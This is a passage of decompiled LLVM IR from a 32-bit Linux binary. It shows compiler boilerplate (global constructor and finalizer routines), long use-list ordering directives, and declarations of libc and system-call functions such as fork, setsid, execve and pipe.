  uselistorder i8 0, { 39, 4, 7, 8, 40, 6, 5, 149, 150, 10, 157, 152, 153, 9, 155, 156, 154, 31, 158, 1, 2, 61, 62, 63, 159, 160, 34, 162, 11, 13, 83, 82, 12, 41, 163, 164, 165, 94, 95, 16, 173, 169, 170, 168, 14, 171, 172, 15, 32, 174, 175, 184, 185, 186, 187, 188, 199, 200, 18, 85, 84, 17, 86, 87, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 3, 195, 112, 113, 221, 114, 224, 42, 56, 37, 38, 79, 19, 223, 205, 206, 64, 207, 208, 209, 210, 211, 212, 43, 213, 21, 193, 194, 20, 151, 115, 116, 57, 29, 28, 0, 44, 45, 46, 117, 189, 77, 161, 179, 180, 176, 178, 177, 118, 119, 120, 121, 122, 123, 124, 125, 126, 22, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 30, 140, 141, 142, 143, 144, 145, 146, 147, 59, 222, 181, 182, 183, 148, 166, 167, 65, 66, 23, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 80, 81, 88, 89, 90, 91, 92, 93, 58, 35, 190, 191, 192, 196, 197, 198, 24, 201, 202, 36, 203, 33, 204, 214, 219, 218, 25, 215, 216, 27, 217, 26, 220, 60, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 119, 120, 13, 121, 122, 123, 124, 14, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 36, 43, 37, 38, 39, 40, 41, 42, 141, 142, 8, 9, 50, 1, 51, 60, 11, 17, 143, 144, 15, 10, 16, 145, 150, 151, 152, 153, 154, 157, 158, 159, 160, 12, 52, 2, 53, 61, 62, 30, 63, 147, 148, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 27, 89, 90, 91, 92, 28, 93, 24, 18, 46, 47, 48, 49, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 19, 185, 161, 162, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 20, 201, 202, 204, 205, 206, 207, 203, 210, 155, 0, 31, 32, 146, 94, 95, 96, 97, 98, 99, 100, 29, 101, 102, 103, 104, 105, 106, 21, 22, 3, 4, 107, 108, 23, 109, 110, 111, 112, 113, 115, 116, 117, 118, 34, 35, 114, 208, 149, 209, 211, 212, 213, 33, 44, 45, 54, 55, 56, 57, 58, 59, 156 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054985, { 1, 0 }
  uselistorder label %dec_label_pc_8054981, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054965, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805499c = load i32, i32* @global_var_8059668.221, align 8
  %v10_80549a1 = icmp eq i32 %v0_805499c, -1
  br i1 %v10_80549a1, label %dec_label_pc_80549bc, label %dec_label_pc_80549b0.preheader

dec_label_pc_80549b0.preheader:                   ; preds = %entry
  br label %dec_label_pc_80549b0

dec_label_pc_80549b0:                             ; preds = %dec_label_pc_80549b0.preheader, %dec_label_pc_80549b0
  %v4_80549b3 = phi i32 [ %v0_805499c, %dec_label_pc_80549b0.preheader ], [ %v2_80549b5, %dec_label_pc_80549b0 ]
  %v0_80549b0 = phi i32 [ ptrtoint (i32* @global_var_8059668.221 to i32), %dec_label_pc_80549b0.preheader ], [ %v1_80549b0, %dec_label_pc_80549b0 ]
  %v1_80549b0 = add i32 %v0_80549b0, -4
  call void @__pseudo_call(i32 %v4_80549b3)
  %v1_80549b5 = inttoptr i32 %v1_80549b0 to i32*
  %v2_80549b5 = load i32, i32* %v1_80549b5, align 4
  %v10_80549b7 = icmp eq i32 %v2_80549b5, -1
  %v1_80549ba = icmp eq i1 %v10_80549b7, false
  br i1 %v1_80549ba, label %dec_label_pc_80549b0, label %dec_label_pc_80549bc.loopexit

dec_label_pc_80549bc.loopexit:                    ; preds = %dec_label_pc_80549b0
  %v2_80549bc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80549bc

dec_label_pc_80549bc:                             ; preds = %dec_label_pc_80549bc.loopexit, %entry
  %v2_80549bc = phi i32 [ %v2_80549bc.pre, %dec_label_pc_80549bc.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_80549bc

; uselistorder directives
  uselistorder i32 %v0_805499c, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 45, 22, 36, 37, 38, 39, 51, 52, 53, 54, 5, 55, 1, 50, 23, 40, 3, 41, 42, 43, 6, 56, 57, 58, 59, 60, 61, 7, 48, 46, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 8, 2, 44, 9, 0, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_8059668.221 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 423, 862, 250, 733, 863, 246, 864, 112, 865, 263, 866, 867, 53, 425, 424, 133, 264, 265, 868, 251, 247, 871, 370, 872, 873, 874, 336, 875, 0, 408, 52, 51, 876, 877, 427, 426, 198, 197, 199, 878, 428, 879, 429, 200, 880, 881, 430, 202, 201, 203, 760, 761, 762, 763, 764, 765, 766, 767, 768, 434, 433, 432, 409, 431, 410, 82, 81, 80, 83, 769, 770, 437, 436, 435, 411, 412, 139, 135, 137, 134, 136, 138, 309, 882, 883, 242, 404, 884, 885, 266, 886, 337, 888, 889, 438, 94, 310, 893, 890, 891, 892, 252, 441, 440, 439, 114, 115, 894, 442, 128, 797, 798, 799, 267, 800, 895, 896, 897, 443, 205, 204, 206, 207, 338, 898, 65, 899, 444, 129, 268, 269, 90, 92, 91, 93, 270, 445, 77, 311, 1, 447, 446, 78, 79, 448, 208, 449, 140, 339, 450, 243, 903, 904, 248, 905, 271, 253, 906, 907, 908, 909, 910, 911, 912, 272, 453, 452, 451, 928, 929, 930, 931, 932, 933, 934, 935, 2, 936, 273, 937, 938, 939, 274, 940, 941, 275, 942, 943, 944, 945, 946, 340, 421, 455, 454, 55, 54, 56, 312, 313, 989, 990, 991, 992, 254, 801, 802, 803, 456, 126, 457, 811, 458, 130, 131, 314, 913, 413, 209, 342, 812, 813, 814, 276, 341, 459, 815, 816, 817, 277, 818, 819, 471, 470, 469, 468, 467, 466, 465, 464, 463, 462, 461, 460, 218, 219, 215, 211, 217, 210, 212, 214, 213, 216, 978, 979, 3, 177, 176, 175, 174, 173, 472, 220, 221, 473, 184, 183, 820, 821, 474, 122, 121, 123, 1049, 1050, 1051, 475, 48, 46, 47, 45, 822, 476, 27, 24, 26, 22, 23, 25, 315, 316, 479, 478, 477, 480, 109, 481, 482, 20, 484, 483, 108, 486, 485, 107, 487, 222, 488, 223, 489, 224, 490, 225, 491, 84, 493, 492, 161, 494, 127, 496, 495, 106, 497, 501, 500, 499, 498, 104, 1054, 1055, 1056, 504, 503, 502, 95, 97, 96, 317, 506, 505, 508, 507, 226, 509, 318, 382, 732, 4, 515, 514, 513, 512, 511, 510, 125, 124, 1052, 518, 517, 516, 119, 117, 118, 343, 519, 791, 792, 793, 794, 520, 148, 147, 149, 145, 146, 319, 521, 150, 151, 856, 734, 249, 857, 383, 858, 414, 522, 68, 67, 66, 69, 523, 74, 71, 70, 72, 76, 75, 73, 63, 60, 62, 64, 59, 61, 344, 525, 524, 345, 526, 346, 527, 347, 530, 529, 528, 384, 533, 532, 531, 227, 348, 1003, 1004, 1005, 534, 186, 1006, 1007, 255, 1008, 1009, 1010, 169, 167, 168, 385, 1002, 278, 228, 229, 230, 231, 349, 320, 771, 772, 773, 774, 537, 536, 535, 171, 170, 172, 350, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 279, 1020, 1021, 1022, 1023, 1024, 323, 1025, 1026, 241, 324, 1027, 1028, 1029, 1030, 321, 322, 1031, 1032, 1033, 540, 539, 538, 101, 100, 99, 103, 102, 325, 326, 541, 327, 328, 280, 545, 544, 543, 542, 194, 281, 386, 546, 547, 548, 549, 550, 551, 552, 553, 947, 5, 948, 351, 260, 352, 952, 6, 558, 557, 556, 555, 554, 57, 58, 559, 560, 980, 981, 561, 98, 564, 563, 562, 21, 565, 971, 972, 973, 869, 870, 823, 824, 422, 566, 158, 954, 955, 956, 957, 958, 959, 960, 825, 949, 950, 951, 568, 567, 41, 40, 39, 787, 788, 570, 569, 44, 43, 42, 261, 887, 1058, 571, 153, 152, 154, 572, 573, 916, 917, 918, 282, 182, 353, 354, 355, 915, 574, 356, 357, 914, 283, 7, 576, 575, 232, 358, 577, 192, 359, 578, 113, 329, 579, 50, 49, 826, 827, 735, 285, 828, 829, 830, 831, 832, 834, 835, 836, 286, 837, 838, 387, 284, 839, 287, 840, 841, 842, 833, 583, 582, 581, 580, 31, 33, 32, 28, 29, 30, 34, 843, 584, 165, 162, 164, 163, 288, 585, 844, 845, 587, 586, 35, 36, 846, 847, 736, 737, 330, 848, 331, 849, 850, 851, 289, 852, 360, 853, 590, 589, 588, 85, 88, 87, 86, 89, 290, 361, 8, 362, 591, 592, 111, 110, 1053, 594, 593, 233, 234, 332, 1057, 595, 239, 363, 240, 364, 919, 920, 921, 922, 923, 924, 925, 926, 927, 599, 598, 597, 596, 141, 602, 601, 600, 603, 365, 900, 901, 366, 367, 902, 605, 604, 607, 606, 185, 609, 608, 181, 610, 179, 611, 235, 613, 612, 195, 614, 178, 615, 193, 616, 166, 180, 618, 617, 116, 619, 196, 620, 187, 621, 236, 622, 623, 625, 624, 188, 626, 160, 628, 627, 157, 630, 629, 120, 631, 632, 105, 142, 775, 256, 371, 262, 776, 9, 10, 244, 389, 633, 738, 777, 778, 779, 780, 781, 782, 783, 333, 291, 388, 368, 390, 784, 642, 641, 640, 639, 638, 637, 636, 635, 634, 415, 159, 785, 786, 648, 647, 646, 645, 416, 644, 643, 391, 789, 790, 650, 649, 795, 796, 739, 292, 293, 740, 294, 741, 295, 742, 296, 297, 743, 744, 745, 746, 747, 651, 156, 155, 804, 748, 749, 750, 751, 752, 753, 334, 392, 805, 652, 657, 656, 655, 654, 653, 417, 189, 190, 191, 806, 807, 11, 393, 658, 808, 809, 810, 662, 661, 660, 659, 37, 38, 854, 394, 665, 664, 663, 855, 669, 668, 667, 666, 859, 755, 12, 756, 757, 758, 759, 860, 861, 675, 674, 673, 672, 671, 670, 143, 144, 395, 396, 676, 680, 679, 678, 677, 375, 754, 953, 681, 682, 237, 238, 298, 683, 685, 684, 13, 14, 300, 961, 397, 299, 335, 962, 963, 687, 686, 376, 964, 965, 398, 372, 373, 966, 688, 418, 967, 968, 689, 374, 399, 301, 969, 970, 696, 695, 694, 693, 692, 691, 690, 245, 974, 975, 697, 377, 698, 699, 700, 701, 302, 976, 977, 703, 702, 704, 982, 983, 15, 400, 984, 303, 304, 985, 986, 707, 706, 705, 419, 987, 709, 708, 988, 378, 993, 994, 379, 995, 996, 380, 381, 997, 998, 710, 999, 16, 1000, 401, 402, 714, 713, 712, 711, 403, 17, 305, 1001, 716, 715, 718, 717, 18, 721, 720, 719, 723, 722, 1034, 1035, 405, 1043, 1044, 259, 1045, 725, 724, 369, 19, 727, 726, 306, 1036, 258, 1037, 1038, 307, 1039, 257, 1041, 1042, 308, 406, 407, 1040, 420, 1046, 1047, 728, 1048, 1059, 132, 730, 729, 731 }
  uselistorder label %dec_label_pc_80549b0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80549c7 = load i32, i32* @ebx, align 4
  %v1_80549c8 = call i32 @__get_pc_thunk_bx(i32 %v0_80549c7)
  store i32 %v1_80549c8, i32* @eax, align 4
  %v0_80549d3 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80549d3

; uselistorder directives
  uselistorder i32* @eax, { 13, 30, 103, 2, 104, 105, 1, 106, 0, 29, 102, 107, 31, 108, 54, 55, 57, 14, 56, 109, 114, 110, 111, 112, 113, 4, 5, 90, 91, 201, 115, 45, 35, 122, 36, 123, 124, 125, 126, 48, 49, 142, 143, 50, 144, 38, 145, 39, 40, 41, 146, 147, 148, 149, 42, 150, 151, 152, 153, 43, 135, 189, 203, 204, 47, 205, 206, 208, 51, 209, 6, 207, 10, 12, 202, 100, 15, 58, 59, 155, 60, 190, 192, 193, 191, 61, 62, 194, 195, 197, 198, 196, 154, 44, 7, 8, 131, 132, 133, 37, 134, 127, 128, 129, 130, 63, 64, 136, 137, 65, 66, 92, 94, 93, 95, 96, 98, 53, 97, 138, 139, 46, 140, 141, 116, 32, 33, 117, 118, 119, 120, 34, 121, 16, 67, 68, 69, 17, 18, 20, 19, 70, 72, 73, 71, 74, 75, 76, 77, 78, 21, 79, 22, 80, 23, 81, 24, 25, 82, 83, 84, 85, 86, 87, 88, 26, 89, 99, 27, 3, 28, 52, 101, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 184, 181, 182, 183, 185, 186, 187, 188, 210, 199, 200, 9, 11 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1169, 19, 20, 21, 117, 76, 687, 1170, 1173, 1171, 1172, 688, 950, 951, 291, 1184, 1176, 1178, 1179, 24, 66, 1180, 1181, 1182, 689, 1183, 130, 131, 132, 1174, 1175, 139, 1185, 1186, 1188, 1189, 1187, 1190, 254, 1191, 1192, 1193, 1194, 1195, 1196, 141, 142, 690, 326, 327, 808, 691, 809, 140, 810, 811, 812, 813, 814, 815, 79, 80, 816, 817, 818, 662, 819, 78, 692, 77, 693, 143, 144, 694, 22, 695, 820, 23, 696, 145, 328, 697, 698, 146, 699, 1199, 700, 1197, 233, 1198, 329, 330, 147, 148, 67, 701, 1200, 1201, 1202, 1203, 1204, 331, 702, 703, 149, 1205, 25, 81, 923, 113, 114, 704, 1206, 82, 705, 26, 706, 952, 332, 1207, 1208, 1209, 953, 954, 16, 255, 151, 150, 955, 956, 256, 957, 707, 1210, 1211, 708, 958, 709, 959, 960, 961, 962, 1212, 152, 710, 153, 333, 1219, 1215, 1216, 1217, 1218, 120, 27, 1232, 1233, 1246, 1247, 1248, 1249, 1255, 1256, 1257, 1258, 1250, 1251, 1252, 1253, 1254, 83, 84, 711, 1259, 1260, 154, 712, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 155, 1336, 1337, 156, 1338, 1339, 1340, 85, 121, 257, 133, 713, 122, 963, 157, 964, 28, 123, 115, 965, 215, 158, 966, 0, 967, 1220, 1221, 1228, 334, 1229, 714, 968, 335, 969, 970, 971, 972, 973, 974, 975, 159, 715, 976, 977, 978, 979, 160, 980, 716, 210, 336, 161, 717, 718, 719, 162, 981, 258, 982, 1322, 1323, 1324, 259, 314, 315, 1325, 1326, 1327, 1328, 1329, 1330, 720, 260, 983, 116, 721, 984, 163, 261, 262, 985, 986, 722, 987, 988, 989, 990, 109, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1, 216, 991, 124, 992, 217, 723, 724, 993, 164, 994, 1348, 1363, 1364, 1365, 337, 1366, 936, 1367, 829, 1420, 1421, 1422, 1423, 1424, 821, 1425, 1368, 1369, 1426, 165, 1427, 1438, 1439, 29, 725, 2, 138, 726, 727, 1451, 1455, 218, 1456, 166, 634, 338, 339, 3, 1428, 1429, 1430, 167, 168, 776, 661, 169, 728, 830, 263, 264, 170, 831, 832, 171, 172, 834, 833, 835, 836, 340, 635, 837, 839, 838, 840, 1431, 1432, 173, 729, 1437, 885, 886, 887, 888, 730, 731, 889, 890, 891, 265, 174, 175, 732, 822, 733, 823, 176, 734, 177, 735, 1158, 86, 1159, 1160, 1161, 1162, 1163, 4, 736, 1301, 737, 824, 825, 826, 827, 738, 178, 1440, 636, 179, 266, 1444, 1447, 1446, 1372, 267, 1373, 1374, 1375, 1376, 268, 1377, 1378, 1379, 341, 1370, 342, 1371, 343, 739, 841, 134, 842, 269, 740, 843, 741, 742, 344, 637, 743, 345, 638, 180, 744, 1380, 1381, 181, 182, 346, 639, 136, 69, 70, 1382, 1383, 1384, 1385, 1386, 1387, 183, 184, 347, 640, 135, 1388, 219, 1389, 118, 1390, 1391, 1393, 745, 1392, 5, 828, 6, 1445, 844, 845, 846, 847, 849, 848, 7, 270, 1349, 1350, 1351, 1279, 746, 271, 1280, 747, 1281, 1282, 1283, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1341, 1331, 185, 186, 748, 749, 272, 1452, 1454, 30, 1177, 8, 187, 995, 996, 348, 997, 188, 750, 998, 220, 125, 1302, 1303, 999, 87, 1284, 273, 274, 189, 1000, 1001, 1002, 190, 1230, 88, 751, 1222, 752, 1227, 1226, 221, 753, 754, 1223, 1225, 1224, 222, 755, 850, 1231, 851, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 191, 756, 1015, 275, 1016, 1017, 1018, 1019, 1020, 31, 32, 757, 241, 242, 1021, 1022, 1023, 1024, 192, 1025, 1026, 1027, 758, 1028, 33, 34, 193, 759, 1029, 1030, 1031, 1034, 1032, 1033, 35, 71, 89, 1035, 1036, 1037, 1038, 316, 1039, 1040, 194, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 196, 1049, 1050, 1051, 760, 1052, 1053, 223, 224, 1054, 1055, 1056, 197, 195, 1057, 198, 1058, 1059, 761, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 199, 762, 763, 200, 1079, 1080, 1081, 764, 765, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 766, 767, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 768, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 276, 769, 277, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 278, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 36, 90, 91, 92, 93, 1138, 1139, 1140, 1141, 1142, 1143, 201, 1144, 770, 1145, 1146, 1147, 1148, 641, 1149, 1150, 1151, 1152, 1153, 1154, 202, 771, 119, 68, 110, 1067, 225, 1433, 1434, 226, 1436, 1435, 94, 349, 772, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 279, 1244, 203, 773, 774, 1245, 1155, 204, 1213, 775, 1214, 1419, 205, 1164, 1441, 1442, 1443, 852, 1332, 1347, 853, 1354, 1448, 137, 280, 1409, 1453, 1355, 1410, 854, 1356, 206, 855, 856, 857, 858, 859, 860, 862, 863, 861, 864, 1310, 1357, 1358, 865, 1449, 1450, 664, 211, 353, 642, 212, 354, 643, 866, 352, 95, 17, 18, 355, 867, 665, 362, 363, 284, 285, 283, 356, 644, 364, 365, 37, 207, 281, 350, 666, 868, 208, 282, 351, 663, 869, 227, 126, 358, 646, 292, 357, 645, 870, 871, 872, 873, 875, 234, 874, 667, 876, 366, 367, 368, 369, 877, 647, 648, 359, 360, 361, 243, 244, 245, 97, 879, 370, 878, 373, 374, 96, 371, 375, 376, 372, 880, 377, 881, 317, 882, 883, 884, 378, 127, 286, 38, 39, 892, 668, 669, 390, 391, 382, 893, 895, 383, 384, 894, 230, 896, 670, 392, 393, 379, 897, 899, 380, 381, 898, 229, 900, 318, 901, 902, 903, 904, 671, 394, 395, 385, 905, 907, 386, 387, 906, 228, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 672, 396, 397, 388, 918, 673, 398, 399, 389, 919, 920, 674, 400, 401, 921, 922, 675, 402, 403, 676, 404, 405, 677, 448, 449, 924, 293, 925, 40, 294, 926, 213, 927, 678, 407, 408, 679, 409, 410, 680, 411, 412, 681, 413, 414, 682, 415, 416, 214, 683, 417, 418, 928, 319, 929, 930, 931, 932, 406, 933, 649, 934, 935, 128, 937, 938, 240, 41, 238, 239, 939, 320, 940, 941, 942, 943, 650, 944, 420, 945, 651, 419, 237, 235, 42, 236, 652, 946, 947, 948, 949, 43, 421, 1156, 1157, 44, 72, 98, 246, 424, 422, 423, 653, 654, 425, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 655, 801, 802, 656, 298, 803, 295, 296, 297, 804, 805, 657, 427, 806, 1165, 1166, 45, 101, 1167, 46, 47, 426, 1168, 99, 73, 100, 428, 658, 15, 247, 248, 249, 1293, 429, 1294, 1295, 1296, 287, 1297, 106, 1298, 1299, 1300, 48, 102, 103, 104, 105, 659, 49, 50, 51, 52, 53, 9, 10, 11, 12, 1304, 1306, 1307, 1308, 432, 1309, 430, 299, 431, 300, 1305, 321, 433, 434, 288, 301, 289, 13, 290, 684, 435, 1311, 250, 251, 252, 253, 437, 1312, 436, 438, 302, 1313, 1314, 439, 54, 55, 1319, 56, 74, 1320, 303, 1315, 1316, 440, 441, 1317, 1318, 322, 442, 443, 444, 304, 660, 1321, 1333, 1334, 1335, 685, 305, 445, 447, 307, 446, 306, 107, 57, 75, 1342, 1343, 323, 1344, 1345, 129, 1346, 58, 324, 108, 686, 1352, 450, 451, 452, 1353, 454, 453, 1359, 1360, 1361, 1362, 455, 59, 456, 457, 458, 459, 460, 1403, 112, 111, 60, 310, 311, 1394, 1395, 1396, 1397, 231, 308, 309, 312, 1398, 1399, 1400, 1401, 61, 62, 63, 1402, 325, 64, 65, 1404, 1405, 313, 14, 1406, 1407, 1408, 209, 807, 232, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
